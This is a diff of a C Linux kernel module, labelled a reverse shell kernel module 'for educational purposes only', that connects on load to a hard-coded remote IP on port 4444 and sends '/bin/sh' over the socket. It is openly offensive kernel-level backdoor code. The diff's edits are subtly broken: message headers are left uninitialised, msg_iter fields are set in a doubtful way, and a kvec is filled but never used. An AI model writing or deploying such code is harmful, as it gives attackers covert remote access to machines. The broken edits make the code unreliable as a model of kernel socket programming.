@@ -10,9 +10,9 @@
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("cocomelonc");
-MODULE_DESCRIPTION("reverse shell Kernel Module");
+MODULE_DESCRIPTION("Reverse Shell Kernel Module (For Educational Purposes Only)");
 
-#define REMOTE_IP "192.168.56.1"  // Replace with the target IP
+#define REMOTE_IP "192.168.1.100"  // Replace with the target IP
 #define REMOTE_PORT 4444       // Replace with the target port
 #define SHELL_CMD "/bin/sh"
 
@@ -22,8 +22,9 @@ static int __init reverse_shell_init(void) {
   struct sockaddr_in sa;
   char *shell_command = SHELL_CMD;
   int ret;
-  struct iovec iov;
   struct msghdr msg;
+  struct iovec iov;
+  struct kvec kvec;
 
   // Create the socket
   ret = sock_create(AF_INET, SOCK_STREAM, IPPROTO_TCP, &client_socket);
@@ -41,22 +42,25 @@ static int __init reverse_shell_init(void) {
   // Connect to the remote server
   ret = client_socket->ops->connect(client_socket, (struct sockaddr *)&sa, sizeof(sa), 0);
   if (ret < 0) {
-    printk(KERN_ERR "failed to connect to the server\n");
+    printk(KERN_ERR "Failed to connect to the server\n");
     sock_release(client_socket);
     return ret;
   }
 
-  printk(KERN_INFO "connected to %s:%d\n", REMOTE_IP, REMOTE_PORT);
+  printk(KERN_INFO "Connected to %s:%d\n", REMOTE_IP, REMOTE_PORT);
 
   // Prepare the message to send
   iov.iov_base = shell_command;
   iov.iov_len = strlen(shell_command);
 
-  memset(&msg, 0, sizeof(msg));
+  // Create message headers
   msg.msg_name = (struct sockaddr *)&sa;
   msg.msg_namelen = sizeof(sa);
-  msg.msg_iov = &iov;
-  msg.msg_iovlen = 1;
+  msg.msg_iter.iov = &iov;
+  msg.msg_iter.iovlen = 1;
+  
+  kvec.iov_base = shell_command;
+  kvec.iov_len = strlen(shell_command);
 
   // Send the shell command
   ret = client_socket->ops->sendmsg(client_socket, &msg, strlen(shell_command));
